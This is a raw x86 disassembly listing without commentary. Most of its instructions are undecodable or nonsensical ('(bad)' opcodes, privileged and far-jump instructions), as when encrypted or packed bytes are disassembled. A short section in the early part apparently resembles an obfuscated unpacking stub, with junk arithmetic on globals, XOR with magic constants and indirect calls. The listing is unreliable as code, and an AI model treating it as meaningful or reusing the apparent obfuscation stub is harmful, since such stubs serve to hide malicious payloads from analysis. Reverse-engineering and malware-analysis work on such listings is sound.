  416a3e:	jb     0x416a9e
  416a40:	inc    ebp
  416a41:	xchg   edx,eax
  416a42:	imul   eax,DWORD PTR [ecx],0x5e
  416a45:	ror    ebx,cl
  416a47:	xchg   DWORD PTR [edi],ebx
  416a49:	in     al,0xce
  416a4b:	stc    
  416a4c:	shl    DWORD PTR [ecx],0xcb
  416a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a50:	mov    ecx,0x53c5375e
  416a55:	adc    esp,0x7f9bfad6
  416a5b:	(bad)  
  416a5c:	mov    dh,0x79
  416a5e:	xchg   ecx,eax
  416a5f:	or     al,0x28
  416a61:	lea    ecx,[ebx-0x5d]
  416a64:	out    dx,al
  416a65:	mov    ecx,DWORD PTR [ebp+0x7e7e65e2]
  416a6b:	ret    
  416a6c:	retf   
  416a6d:	push   edi
  416a6e:	mov    cs,WORD PTR [ebx+0x48340532]
  416a74:	aad    0x7c
  416a76:	popa   
  416a77:	hlt    
  416a78:	inc    eax
  416a79:	pop    ebx
  416a7a:	(bad)  
  416a7b:	fdivr  DWORD PTR [edi-0x2b7c76c1]
  416a81:	adc    eax,0xecc48d94
  416a86:	cmp    eax,0xf9c662f3
  416a8b:	sub    BYTE PTR [ebp+esi*4+0x2c08541c],0x74
  416a93:	imul   esp,DWORD PTR [eax-0xbac04db],0xe075ffd9
  416a9d:	mov    eax,DWORD PTR [ebp-0x8]
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x424016
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423e12
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x423f9a
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x42431d
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0xfce19036
  416c75:	dec    ebp
  416c77:	cmp    DWORD PTR [edx+0x24],0x61
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx-0x45]
  416c81:	dec    ebx
  416c82:	jae    0x416cc5
  416c84:	adc    BYTE PTR [esi-0x7e],ah
  416c87:	dec    esp
  416c88:	lods   al,BYTE PTR ds:[esi]
  416c89:	cwde   
  416c8a:	xlat   BYTE PTR ds:[ebx]
  416c8b:	call   0x1e54:0xb0700c97
  416c92:	sti    
  416c93:	cmp    DWORD PTR [ecx-0xc],ebx
  416c96:	fs out 0xf1,al
  416c99:	xchg   ecx,eax
  416c9a:	loope  0x416c92
  416c9c:	jl     0x416cb6
  416c9e:	push   edx
  416c9f:	xor    bh,BYTE PTR [eax-0x46]
  416ca2:	ss std 
  416ca4:	sub    al,cl
  416ca6:	js     0x416cd0
  416ca8:	aam    0x6
  416caa:	(bad)  
  416cab:	mov    ah,0x37
  416cad:	aaa    
  416cae:	or     eax,0xd34c1eb
  416cb3:	jbe    0x416cc2
  416cb5:	dec    esp
  416cb6:	jg     0x416d1f
  416cb8:	add    DWORD PTR [ecx-0x5e],ecx
  416cbb:	jg     0x416cc9
  416cbd:	inc    ebp
  416cbe:	inc    esi
  416cbf:	sub    DWORD PTR [eax+0x3bb4cf56],ecx
  416cc5:	add    DWORD PTR [ebx],ebp
  416cc7:	fild   QWORD PTR [ebx]
  416cc9:	jmp    0x77b9:0x7c2af992
  416cd0:	test   BYTE PTR [ebx+0x1],0x1d
  416cd4:	ds dec edx
  416cd6:	cmp    BYTE PTR [edi+ebx*1],dh
  416cd9:	scas   al,BYTE PTR es:[edi]
  416cda:	xor    bh,BYTE PTR [ecx]
  416cdc:	addr16 pop ecx
  416cde:	fst    QWORD PTR [ecx+0x6f]
  416ce1:	into   
  416ce2:	add    ah,dh
  416ce4:	adc    BYTE PTR [ebx],dl
  416ce6:	adc    esp,DWORD PTR [esi+0x7dfa8911]
  416cec:	loop   0x416d2a
  416cee:	jmp    0xb00eeb2f
  416cf3:	adc    eax,0x7327e0e3
  416cf8:	mov    edi,0xac434c21
  416cfd:	ja     0x416cd0
  416cff:	fnstenv [edi]
  416d01:	sar    DWORD PTR [edx],1
  416d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d04:	cmp    cl,ch
  416d06:	pop    ebx
  416d07:	push   edx
  416d08:	call   0xb323:0x70f2e18d
  416d0f:	or     eax,DWORD PTR [esi+0x285a6b3]
  416d15:	imul   ecx,edx,0x60
  416d18:	inc    ebx
  416d19:	clc    
  416d1a:	inc    esp
  416d1b:	add    al,0x6d
  416d1d:	in     al,0x48
  416d1f:	stos   BYTE PTR es:[edi],al
  416d20:	jo     0x416ccb
  416d22:	inc    edi
  416d23:	mov    dh,BYTE PTR [ecx+0x343af55a]
  416d29:	push   0x6c
  416d2b:	sub    DWORD PTR [edi+0x33c4209b],0xffffff83
  416d32:	cmc    
  416d33:	mov    al,ds:0x8d3fdbba
  416d38:	repz hlt 
  416d3a:	pop    ebx
  416d3b:	inc    edi
  416d3c:	inc    edx
  416d3d:	fs xchg edx,eax
  416d3f:	arpl   sp,di
  416d41:	aad    0x5a
  416d43:	scas   al,BYTE PTR es:[edi]
  416d44:	jp     0x416d2f
  416d46:	add    al,0x48
  416d48:	test   DWORD PTR [ebp+0x2e],ecx
  416d4b:	mov    ebp,0x53e2fb26
  416d50:	pop    ebx
  416d51:	dec    ebp
  416d52:	je     0x416d2c
  416d54:	(bad)  
  416d56:	xchg   BYTE PTR [ebx],bl
  416d58:	test   BYTE PTR [eax+ebp*2+0xe],cl
  416d5c:	xchg   edi,eax
  416d5d:	mov    cs,WORD PTR [ebx+eiz*4-0x5f]
  416d61:	dec    edx
  416d62:	jl     0x416d26
  416d64:	test   eax,0x33a15b2a
  416d69:	fsub   DWORD PTR [ebx-0x6a]
  416d6c:	push   ss
  416d6d:	enter  0xcf31,0x95
  416d71:	std    
  416d72:	int    0x2b
  416d74:	dec    ecx
  416d75:	dec    ebx
  416d76:	(bad)  
  416d77:	out    dx,eax
  416d78:	or     eax,0x2abcc3d5
  416d7d:	inc    ecx
  416d7e:	test   cl,ah
  416d80:	in     eax,0x5f
  416d82:	test   DWORD PTR [edi],edx
  416d84:	ret    0xca0d
  416d87:	ficomp WORD PTR [edi+0x57bfaf72]
  416d8d:	inc    ebp
  416d8e:	cli    
  416d8f:	push   ss
  416d90:	repz shl dl,cl
  416d93:	repz sub ah,0xd5
  416d97:	cmp    esp,edx
  416d99:	sub    DWORD PTR ds:0x3349a515,edi
  416d9f:	push   ecx
  416da0:	mov    esi,0x557d6f29
  416da5:	int3   
  416da6:	mov    bh,0xf6
  416da8:	jns    0x416d73
  416daa:	xchg   BYTE PTR [edi-0x44de5518],cl
  416db0:	inc    edx
  416db1:	outs   dx,BYTE PTR ds:[esi]
  416db2:	ds aam 0x6c
  416db5:	xchg   ebp,eax
  416db6:	mov    edx,0x43c311e3
  416dbb:	loop   0x416dd1
  416dbd:	xor    esi,DWORD PTR [ebx-0x45]
  416dc0:	mov    ebp,0x15a2a9d
  416dc5:	push   eax
  416dc6:	xor    dh,ch
  416dc8:	push   ebx
  416dc9:	out    0xf9,al
  416dcb:	push   esi
  416dcc:	lahf   
  416dcd:	popf   
  416dce:	paddsw mm6,mm7
  416dd1:	add    ecx,edx
  416dd3:	inc    ebx
  416dd4:	aaa    
  416dd5:	xor    al,0x90
  416dd7:	std    
  416dd8:	repnz adc ebp,DWORD PTR [edx]
  416ddb:	mov    cl,0x3c
  416ddd:	jmp    0xbe2f7c55
  416de2:	into   
  416de3:	pop    esi
  416de4:	dec    edx
  416de5:	pushf  
  416de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de7:	mov    ah,ch
  416de9:	dec    edx
  416dea:	sbb    eax,DWORD PTR [ecx+0x1d8eee51]
  416df0:	mov    esi,0xe6c7af2f
  416df5:	mov    al,BYTE PTR [ebx+0x74]
  416df8:	xlat   BYTE PTR ds:[ebx]
  416df9:	sub    al,BYTE PTR [ebx]
  416dfb:	adc    ebx,DWORD PTR [ebp-0x5cefd920]
  416e01:	add    eax,0x9b0ec450
  416e06:	mul    DWORD PTR [ecx+0x6d14ae8b]
  416e0c:	retf   0x2756
  416e0f:	cdq    
  416e10:	xor    ah,BYTE PTR [esi]
  416e12:	nop
  416e13:	pop    es
  416e14:	xchg   BYTE PTR [ebp+0x45],ah
  416e17:	mov    ss,WORD PTR [ecx+0x540ef2a6]
  416e1d:	mov    ds:0x886d29b2,al
  416e22:	jle    0x416dac
  416e24:	lods   eax,DWORD PTR ds:[esi]
  416e25:	out    dx,eax
  416e26:	mul    DWORD PTR [ebp+0x46c0f6c1]
  416e2c:	inc    esi
  416e2d:	es and ebp,edx
  416e30:	setno  BYTE PTR [edx+0x7f]
  416e34:	shl    BYTE PTR [edi-0x57],cl
  416e37:	stc    
  416e38:	inc    ebx
  416e39:	ror    BYTE PTR [edi],cl
  416e3b:	dec    ebp
  416e3c:	xchg   BYTE PTR [edx],bh
  416e3e:	pop    ds
  416e3f:	js     0x416e27
  416e41:	loop   0x416e40
  416e43:	sbb    ah,dl
  416e45:	sub    ebp,DWORD PTR [ebx]
  416e47:	into   
  416e48:	xchg   edx,eax
  416e49:	or     eax,0xbb062435
  416e4e:	push   es
  416e4f:	mov    edi,0xe6f9eeee
  416e54:	das    
  416e55:	push   ebx
  416e56:	pop    es
  416e57:	mov    ebx,0x83831fbf
  416e5c:	cmp    edx,edi
  416e5e:	xor    DWORD PTR [ebp-0x1d91ad24],esp
  416e64:	and    eax,0xf99f0501
  416e69:	les    esi,FWORD PTR [ebx-0x45170235]
  416e6f:	sbb    esp,eax
  416e71:	ins    DWORD PTR es:[edi],dx
  416e72:	mov    cs,WORD PTR [esi-0x1968b36]
  416e78:	push   esp
  416e79:	adc    BYTE PTR ds:0x60152f91,dh
  416e7f:	int3   
  416e80:	bswap  ebp
  416e82:	pop    ss
  416e83:	mov    edi,0x5dea2951
  416e88:	pop    esp
  416e89:	call   0x8712:0x8fd3838e
  416e90:	xchg   ebp,eax
  416e91:	jp     0x416eeb
  416e93:	das    
  416e94:	jl     0x416eae
  416e96:	sti    
  416e97:	pop    esi
  416e98:	mov    edi,0x4c3d9f33
  416e9d:	mov    ds:0x7c14bc25,eax
  416ea2:	inc    esp
  416ea3:	pusha  
  416ea4:	or     al,0xa7
  416ea6:	add    DWORD PTR [ecx],ebx
  416ea8:	call   FWORD PTR [ebx-0x76a33b82]
  416eae:	xor    dl,dl
  416eb0:	add    eax,esi
  416eb2:	jae    0x416ef4
  416eb4:	mov    bh,0xf7
  416eb6:	and    eax,0x8a371628
  416ebb:	and    eax,0x873e97f0
  416ec0:	iret   
  416ec1:	jle    0x416e93
  416ec3:	addr16 pop eax
  416ec5:	test   esp,0x126a3d1c
  416ecb:	ret    
  416ecc:	push   ebx
  416ecd:	shl    BYTE PTR [ebx-0x26],1
  416ed0:	add    BYTE PTR [edx],bl
  416ed2:	jno    0x416ec7
  416ed4:	pop    fs
  416ed6:	xchg   ecx,eax
  416ed7:	pop    edx
  416ed8:	mov    al,0xaa
  416eda:	sahf   
  416edb:	adc    bl,BYTE PTR [ebp+0x5f2f5e8e]
  416ee1:	push   ss
  416ee2:	xadd   ebx,eax
  416ee5:	sub    ah,al
  416ee7:	mov    ah,al
  416ee9:	in     eax,0x2d
  416eeb:	jmp    0x2e047106
  416ef0:	addr16 dec esi
  416ef2:	loope  0x416f49
  416ef4:	call   0x7ba8:0x826cc50a
  416efb:	pop    DWORD PTR [ebp-0x1e]
  416efe:	ret    0x226b
  416f01:	jnp    0x416f4d
  416f03:	(bad)  
  416f04:	loopne 0x416f14
  416f06:	int    0xa2
  416f08:	and    esp,DWORD PTR [edx+0x6b]
  416f0b:	push   esi
  416f0c:	cmp    eax,0xa1cf04e0
  416f11:	test   al,0x3d
  416f13:	popa   
  416f14:	int    0xc0
  416f16:	sbb    BYTE PTR [ebx],ah
  416f18:	imul   ebp,DWORD PTR [ecx-0x6700a5eb],0x40eff234
  416f22:	out    0x53,al
  416f24:	mov    dl,dl
  416f26:	xlat   BYTE PTR cs:[ebx]
  416f28:	push   ecx
  416f29:	lods   eax,DWORD PTR ds:[esi]
  416f2a:	and    BYTE PTR [eax+0x3f],dl
  416f2d:	sbb    al,0x14
  416f2f:	arpl   WORD PTR [ebx+0x33],di
  416f32:	mov    dh,0x5f
  416f34:	mov    ebp,0x90bbf1f7
  416f39:	arpl   WORD PTR [edi+0xd7dd4a1],si
  416f3f:	clc    
  416f40:	and    eax,0x36113255
  416f45:	jae    0x416f44
  416f47:	push   ebp
  416f48:	in     eax,0xe1
  416f4a:	imul   ebp,DWORD PTR [esi-0x3b935ecd],0xef3d4004
  416f54:	out    dx,eax
  416f55:	(bad)  
  416f56:	out    0x6a,al
  416f58:	mov    WORD PTR [edi-0x583eb66a],?
  416f5e:	gs jnp 0x416fdf
  416f61:	stos   BYTE PTR es:[edi],al
  416f62:	dec    esi
  416f63:	js     0x416f60
  416f65:	bts    DWORD PTR [edx-0x75],esi
  416f69:	xchg   ebp,eax
  416f6a:	fstp   QWORD PTR [edx+eiz*2+0x618185a1]
  416f71:	scas   eax,DWORD PTR es:[edi]
  416f72:	pop    eax
  416f73:	in     al,dx
  416f74:	fcom   DWORD PTR [edx]
  416f76:	repz and al,0xb9
  416f79:	jmp    0x416f1d
  416f7b:	inc    ebx
  416f7c:	pop    es
  416f7d:	push   DWORD PTR [ecx-0x1346f5b4]
  416f83:	or     DWORD PTR [ebx],edx
  416f85:	xor    al,BYTE PTR [esi]
  416f87:	mov    bh,0x10
  416f89:	rol    BYTE PTR [eax],cl
  416f8b:	mov    ch,0x4c
  416f8d:	mul    DWORD PTR [ecx]
  416f8f:	shl    cl,0x67
  416f92:	dec    esp
  416f93:	xor    eax,0xdf5c6f5
  416f98:	lods   eax,DWORD PTR ds:[esi]
  416f99:	and    dh,BYTE PTR [edx]
  416f9b:	jle    0x416f8b
  416f9d:	sahf   
  416f9e:	cmp    ch,BYTE PTR [eax+0x33c89bb1]
  416fa4:	(bad)  
  416fa5:	jno    0x417005
  416fa7:	cmp    ah,ch
  416fa9:	mov    ds:0x909abc42,eax
  416fae:	cmp    esp,ebx
  416fb0:	jno    0x417029
  416fb2:	lods   al,BYTE PTR ds:[esi]
  416fb3:	xchg   edx,eax
  416fb4:	(bad)  
  416fb5:	call   0xbb85:0x48532acb
  416fbc:	dec    edx
  416fbd:	sub    edi,ecx
  416fbf:	aaa    
  416fc0:	cmp    dh,BYTE PTR [ebx+0x391e97c]
  416fc6:	or     BYTE PTR [eax+ecx*1-0x53f77cc9],al
  416fcd:	mov    dh,0xdd
  416fcf:	and    eax,0xf3403fac
  416fd4:	fwait
  416fd5:	push   ebp
  416fd6:	mov    esp,fs
  416fd8:	cs push 0x9
  416fdb:	xor    cl,BYTE PTR [ecx]
  416fdd:	add    al,0x44
  416fdf:	mov    ax,0x841
  416fe3:	or     ebp,DWORD PTR [eax+0x2672f6b2]
  416fe9:	icebp  
  416fea:	pop    eax
  416feb:	cmp    al,0x23
  416fed:	dec    eax
  416fee:	add    esp,edx
  416ff0:	pop    edi
  416ff1:	add    eax,0x2f34bf9
  416ff6:	ror    esi,1
  416ff8:	add    dl,al
  416ffa:	pop    ebx
  416ffb:	jmp    0x41700c
  416ffd:	ds (bad) 
  416fff:	fisttp WORD PTR [esi-0x2e]
  417002:	ficom  DWORD PTR [eax+ebx*1+0x7eb28a8b]
  417009:	jmp    0x83cd688f
  41700e:	sub    al,0x4a
  417010:	stc    
  417011:	jne    0x417022
  417013:	cdq    
  417014:	(bad)  
  417015:	cdq    
  417016:	cmp    DWORD PTR [eax-0xc0e7410],ecx
  41701c:	fsub   QWORD PTR [ebx]
  41701e:	inc    ebp
  417020:	test   al,0x5e
  417022:	xor    BYTE PTR [edi+0x330d0132],ah
  417028:	inc    edx
  417029:	add    esi,eax
  41702b:	cmc    
  41702c:	call   0xa4bc025e
  417031:	and    edi,edi
  417033:	add    eax,0x7525081d
  417038:	(bad)  
  417039:	inc    BYTE PTR [eax]
  41703b:	pop    esi
  41703c:	or     dh,BYTE PTR [esi]
  41703e:	pop    ebp
  41703f:	or     DWORD PTR [ecx-0x42],0x6fcc83ac
  417046:	(bad)  
  417047:	into   
  417048:	and    dl,BYTE PTR [edx+0x25]
  41704b:	inc    ebp
  41704c:	xchg   edx,eax
  41704d:	xchg   ecx,eax
  41704e:	nop
  41704f:	sub    eax,0xbe374ff
  417054:	inc    ecx
  417055:	xchg   esp,eax
  417056:	push   0xca8ecd4c
  41705b:	(bad)  
  41705c:	(bad)  
  41705d:	xor    al,BYTE PTR [ecx]
  41705f:	sbb    dl,BYTE PTR [edi]
  417061:	add    bl,al
  417063:	mov    ?,edx
  417065:	xor    eax,0x37b2b50c
  41706a:	or     BYTE PTR [edi+0x6bdcdb53],dh
  417070:	in     eax,dx
  417071:	(bad)  
  417072:	ss stos BYTE PTR es:[edi],al
  417074:	enter  0xb52,0x87
  417078:	shr    BYTE PTR [ecx],1
  41707a:	cmp    bh,bl
  41707c:	inc    edi
  41707d:	icebp  
  41707e:	inc    esi
  41707f:	(bad)  [ecx-0x5a]
  417082:	inc    esp
  417083:	xchg   edi,eax
  417084:	xchg   esp,eax
  417085:	and    BYTE PTR [ebx-0x1a],al
  417088:	fneni(8087 only) 
  41708a:	xor    edi,ebp
  41708c:	adc    BYTE PTR ds:0xaf8c9dd5,bl
  417092:	scas   eax,DWORD PTR es:[edi]
  417093:	inc    esi
  417094:	int    0x22
  417096:	xchg   edx,eax
  417097:	add    esi,DWORD PTR [edi+esi*1-0x3cce81ee]
  41709e:	mov    BYTE PTR [eax],dl
  4170a0:	sbb    BYTE PTR [eax-0x24],0x33
  4170a4:	mov    edx,0xa7d78cdc
  4170a9:	(bad)  [ecx+ebx*4-0x653f5bd6]
  4170b0:	xchg   edx,eax
  4170b1:	inc    esp
  4170b2:	push   0xa3fe1b20
  4170b7:	inc    esp
  4170b8:	mov    ebx,0xb1a17237
  4170bd:	in     eax,dx
  4170be:	jae    0x4170c7
  4170c0:	ret    
  4170c1:	mov    al,ds:0x573277f9
  4170c6:	lds    ebx,FWORD PTR [edi]
  4170c8:	inc    edi
  4170c9:	div    BYTE PTR [ebx]
  4170cb:	jno    0x41704f
  4170cd:	add    DWORD PTR [edx+0x46],esi
  4170d0:	arpl   WORD PTR ds:0x1ca4b34f,sp
  4170d6:	and    BYTE PTR [ebp+0x2a],0x6e
  4170da:	push   ebx
  4170db:	mov    ah,0x7a
  4170dd:	neg    DWORD PTR es:[ebx+0x29bed551]
  4170e4:	lahf   
  4170e5:	or     al,0x9e
  4170e7:	add    DWORD PTR [edx],0xffffffe8
  4170ea:	mov    esp,0x530fec4f
  4170ef:	sub    al,0xca
  4170f1:	push   0xffffffcf
  4170f3:	add    dh,BYTE PTR [edi+eiz*2+0x4b52a427]
  4170fa:	mov    ebx,0x8ba7bc0a
  4170ff:	push   cs
  417100:	(bad)  
  417101:	push   esp
  417102:	mov    ds:0x2e867ce8,al
  417107:	push   cs
  417108:	and    cl,ch
  41710a:	mov    ds:0x542cb27f,eax
  41710f:	mov    esi,0x2bc63865
  417114:	mov    ebp,0xb95ca1af
  417119:	mov    esi,0x6535e074
  41711e:	mov    ah,0xd6
  417120:	mov    ch,al
  417122:	jo     0x41716a
  417124:	mov    edi,0xd2fda377
  417129:	or     eax,0x8fb4d1d3
  41712e:	pop    esi
  41712f:	sbb    bh,al
  417131:	jmp    0x824931e2
  417136:	pop    ecx
  417137:	xchg   esp,esi
  417139:	add    al,0xe0
  41713b:	jge    0x417129
  41713d:	test   eax,0x4787e4a0
  417142:	and    BYTE PTR [ecx-0x17],ah
  417145:	mov    dl,0x5
  417147:	inc    ebp
  417148:	repz call 0x14c3aa6e
  41714e:	push   ss
  41714f:	(bad)  
  417150:	popf   
  417151:	retf   0xbbd6
  417154:	inc    edx
  417155:	neg    DWORD PTR [edx-0xc267e33]
  41715b:	add    dl,BYTE PTR [edi-0x454b7612]
  417161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417162:	xor    DWORD PTR ds:0x505aa5af,0xd8fd637a
  41716c:	or     ecx,DWORD PTR [edx]
  41716e:	sbb    BYTE PTR [ebx+0x74a6704],ch
  417174:	mov    esp,0xf868e228
  417179:	jae    0x4171e0
  41717b:	fst    QWORD PTR [ebx-0x2f]
  41717e:	test   DWORD PTR [ecx],ecx
  417180:	je     0x41715c
  417182:	mov    ds:0xef4a357c,al
  417187:	(bad)  
  417188:	jbe    0x41710e
  41718a:	repz adc al,0x5f
  41718d:	xlat   BYTE PTR ds:[ebx]
  41718e:	dec    esp
  41718f:	add    esp,0xffffffe7
  417192:	daa    
  417193:	jne    0x4171a5
  417195:	repz add dl,BYTE PTR [edx+edi*2+0x681067d]
  41719d:	in     ax,0x8e
  4171a0:	push   0x8033f595
  4171a5:	adc    ch,BYTE PTR [eax+0xe]
  4171a8:	sbb    edx,DWORD PTR [eax+0x5f]
  4171ab:	data16 ficom WORD PTR [edx]
  4171ae:	add    esp,DWORD PTR [ebp-0x74194ec8]
  4171b4:	mov    edi,0x601e5223
  4171b9:	and    dl,BYTE PTR [edi+0x70]
  4171bc:	pop    ebx
  4171bd:	mov    DWORD PTR [edx+0x16],eax
  4171c0:	mov    bh,0xa7
  4171c2:	push   edi
  4171c3:	pushf  
  4171c4:	nop
  4171c5:	inc    ebx
  4171c6:	adc    DWORD PTR [ebx],ecx
  4171c8:	cdq    
  4171c9:	jbe    0x41715a
  4171cb:	pop    ss
  4171cc:	push   0x86b81e6f
  4171d1:	pop    edx
  4171d2:	pusha  
  4171d3:	add    bl,ah
  4171d5:	and    BYTE PTR [edx+0x37],dh
  4171d8:	(bad)  
  4171db:	xlat   BYTE PTR ds:[ebx]
  4171dc:	fmul   DWORD PTR [ebx]
  4171de:	dec    esp
  4171df:	fild   QWORD PTR ds:0x1c5393fb
  4171e5:	push   esi
  4171e6:	xor    DWORD PTR [edx+0x419bde69],ebx
  4171ec:	enter  0xbc55,0x71
  4171f0:	and    dh,ah
  4171f2:	jae    0x417220
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	mov    WORD PTR [esi+0x729206c1],ds
  4171fb:	iret   
  4171fc:	mov    WORD PTR [esi+0x2f],cs
  4171ff:	xor    al,0x65
  417201:	pusha  
  417202:	adc    eax,0xa0dc772
  417207:	sbb    eax,DWORD PTR [ebx+0x74]
  41720a:	fisubr WORD PTR [edx]
  41720d:	mov    al,ds:0x4dae91b9
  417212:	adc    eax,0x8cd7c0d1
  417217:	(bad)  
  417219:	out    dx,al
  41721a:	popf   
  41721b:	add    dl,BYTE PTR [esi]
  41721d:	cmp    esp,ebx
  41721f:	sbb    DWORD PTR [ebp+ebx*1-0xe],edi
  417223:	push   0x13
  417225:	mov    bh,0xfe
  417227:	ret    0xd5c0
  41722a:	xchg   BYTE PTR [eax-0x6b],bl
  41722d:	mov    ds:0xb80f5e7c,al
  417232:	into   
  417233:	cdq    
  417234:	jp     0x4171bb
  417236:	mov    ds:0xdd26f6c9,al
  41723b:	lahf   
  41723c:	(bad)
  417240:	in     eax,dx
  417241:	loop   0x41720e
  417243:	ss cmp eax,0x1cdab5d5
  417249:	dec    edi
  41724a:	mov    esp,0x8ae5930b
  41724f:	sbb    al,0x48
  417251:	inc    ebx
  417252:	cmc    
  417253:	xchg   BYTE PTR [esp+eiz*8-0x65],bh
  417257:	dec    ebp
  417258:	stc    
  417259:	mov    ebp,0x852b9130
  41725e:	or     eax,0x6391f610
  417263:	mov    dh,0x1a
  417265:	fbstp  TBYTE PTR [ecx]
  417267:	sbb    ch,BYTE PTR [esi]
  417269:	mov    ?,WORD PTR [edi-0x712043a5]
  41726f:	add    al,0xd8
  417271:	mov    al,0x5b
  417273:	sbb    al,0x80
  417275:	xchg   BYTE PTR [edi+esi*4],dl
  417278:	mov    cl,0x9e
  41727a:	rcr    BYTE PTR [edi],0xbd
  41727d:	dec    edi
  41727e:	test   DWORD PTR [eax],eax
  417280:	(bad)  
  417282:	mov    edi,DWORD PTR [ebp+0x2d]
  417285:	push   es
  417286:	aam    0xf
  417288:	popf   
  417289:	les    edx,FWORD PTR [ecx+0x7d3a3386]
  41728f:	xchg   esi,eax
  417290:	inc    esi
  417291:	fild   WORD PTR [edi+0x15]
  417294:	cmp    edi,DWORD PTR [edi+0x25]
  417297:	or     DWORD PTR [eax+0x78],ebp
  41729a:	mov    esp,ecx
  41729c:	push   ebp
  41729d:	aad    0xab
  41729f:	jp     0x417315
  4172a1:	mov    edi,0xb6f2e3ec
  4172a6:	icebp  
  4172a7:	cmp    DWORD PTR [ebx],ebx
  4172a9:	(bad)  
  4172aa:	jle    0x417321
  4172ac:	inc    esp
  4172ad:	clts   
  4172af:	push   edi
  4172b0:	xchg   ebp,eax
  4172b1:	aaa    
  4172b2:	test   BYTE PTR [eax],ch
  4172b4:	dec    ecx
  4172b5:	(bad)  
  4172b6:	and    al,0x97
  4172b8:	or     ebx,ebp
  4172ba:	outs   dx,BYTE PTR ds:[esi]
  4172bb:	dec    edi
  4172bc:	xlat   BYTE PTR ds:[ebx]
  4172bd:	stos   BYTE PTR es:[edi],al
  4172be:	xchg   esp,eax
  4172bf:	in     eax,dx
  4172c0:	rcl    DWORD PTR [edi-0x35066d3e],1
  4172c6:	jns    0x4172ae
  4172c8:	mov    dh,0x34
  4172ca:	adc    BYTE PTR ds:0x1f2fd141,bl
  4172d0:	fisttp WORD PTR [esi-0x1e57a03d]
  4172d6:	or     al,0x42
  4172d8:	mov    edi,0x8f55b362
